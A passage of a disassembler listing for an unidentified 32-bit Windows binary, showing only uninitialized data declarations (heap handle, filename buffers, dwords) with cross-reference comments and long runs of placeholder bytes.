                                        ; sub_418ACA+5↑w
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42AE94    dd ?                    ; DATA XREF: sub_415704+13↑w
unk_42AE98      db    ? ;               ; DATA XREF: sub_415E1F+27↑o
                db    ? ;
                db    ? ;
                db    ? ;
; LPVOID dword_42AE9C
dword_42AE9C    dd ?                    ; DATA XREF: sub_415E1F+22↑r
dword_42AEA0    dd ?                    ; DATA XREF: sub_416128+8↑w
                                        ; sub_416137+5↑r
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
; HANDLE hHeap
hHeap           dd ?                    ; DATA XREF: sub_40FD55+62↑r
                                        ; sub_40FE32:loc_40FE4C↑r ...
unk_42AEB0      db    ? ;               ; DATA XREF: sub_416797+6↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B000    dd ?                    ; DATA XREF: sub_416976+21E↑r
                                        ; sub_416976+251↑r ...
                align 8
unk_42B008      db    ? ;               ; DATA XREF: sub_41740A+70↑o
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
; CHAR Filename[260]
Filename        db 104h dup(?)          ; DATA XREF: sub_41740A+94↑o
byte_42B125     db ?                    ; DATA XREF: sub_41740A+9C↑w
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B31C    dd ?                    ; DATA XREF: sub_40FE32+82↑r
                                        ; sub_40FEFC+158↑r ...
; CHAR byte_42B320[260]
byte_42B320     db 104h dup(?)          ; DATA XREF: sub_4178B6+1F↑o
byte_42B424     db ?                    ; DATA XREF: sub_4178B6+26↑w
                align 4
dword_42B428    dd ?                    ; DATA XREF: sub_417971+5↑r
                                        ; sub_417971+26↑w ...
dword_42B42C    dd ?                    ; DATA XREF: sub_41888F+C↑r
                                        ; sub_4188C7+B↑w
dword_42B430    dd ?                    ; DATA XREF: sub_418B98+A↑r
dword_42B434    dd ?                    ; DATA XREF: sub_418E45+19↑r
                                        ; sub_418E45+3C↑w ...
dword_42B438    dd ?                    ; DATA XREF: sub_41922F+11↑r
                                        ; sub_41922F+39↑w ...
unk_42B43C      db    ? ;               ; DATA XREF: .data:off_425EDC↑o
                                        ; .data:off_425EE0↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B440    dd ?                    ; DATA XREF: sub_419A62+8↑w
                                        ; sub_419AC4:loc_419B0D↑o ...
dword_42B444    dd ?                    ; DATA XREF: sub_419A62+D↑w
                                        ; sub_419AC4:loc_419B63↑o ...
dword_42B448    dd ?                    ; DATA XREF: sub_419A62+12↑w
                                        ; sub_419AB7↑r ...
dword_42B44C    dd ?                    ; DATA XREF: sub_419A62+17↑w
                                        ; sub_419AC4:loc_419B6F↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B454    dd ?                    ; DATA XREF: sub_419C74+8↑w
                align 10h
dword_42B460    dd ?                    ; DATA XREF: sub_419C83+8↑w
dword_42B464    dd ?                    ; DATA XREF: sub_419C92+8↑w
dword_42B468    dd ?                    ; DATA XREF: sub_41374F+8↑r
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B4A8    dd ?                    ; DATA XREF: sub_41C65F+14↑r
                                        ; sub_41C65F+5C↑w ...
dword_42B4AC    dd ?                    ; DATA XREF: sub_41C65F+71↑w
                                        ; sub_41C65F:loc_41C768↑r
dword_42B4B0    dd ?                    ; DATA XREF: sub_41C65F+86↑w
                                        ; sub_41C65F+126↑r
dword_42B4B4    dd ?                    ; DATA XREF: sub_41C65F+AC↑w
                                        ; sub_41C65F:loc_41C710↑r
dword_42B4B8    dd ?                    ; DATA XREF: sub_41C65F+94↑w
                                        ; sub_41C65F+BA↑r ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
byte_42B578     db ?                    ; DATA XREF: sub_41BAD6:loc_41BC14↑r
                align 4
dword_42B57C    dd ?                    ; DATA XREF: sub_41CEDE:loc_41CF0A↑r
byte_42B580     db ?                    ; DATA XREF: sub_401AE0+5A↑o
                                        ; sub_402A00+1B1↑o ...
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
                db    ? ;
dword_42B780    dd ?                    ; DATA XREF: sub_402A00+22B↑r
                                        ; sub_4059A0+273↑w
byte_42B784     db ?                    ; DATA XREF: sub_402A00:loc_402A81↑r
                                        ; sub_402A00+20B↑o ...
                db    ? ;
                db    ? ;
